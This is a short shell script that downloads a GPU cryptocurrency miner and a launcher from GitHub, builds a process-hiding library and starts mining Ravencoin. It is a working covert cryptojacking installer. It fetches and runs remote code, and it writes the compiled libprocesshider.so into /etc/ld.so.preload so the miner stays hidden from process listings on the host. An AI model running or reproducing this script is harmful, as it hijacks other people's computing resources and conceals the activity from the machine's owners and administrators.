#!/bin/sh
wget https://github.com/NebuTech/NBMiner/releases/download/v37.1/NBMiner_37.1_Linux.tgz
tar -xvzf NBMiner_37.1_Linux.tgz
cd NBMiner_Linux
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ravenminer.sh
chmod +x ravenminer.sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./ravenminer.sh
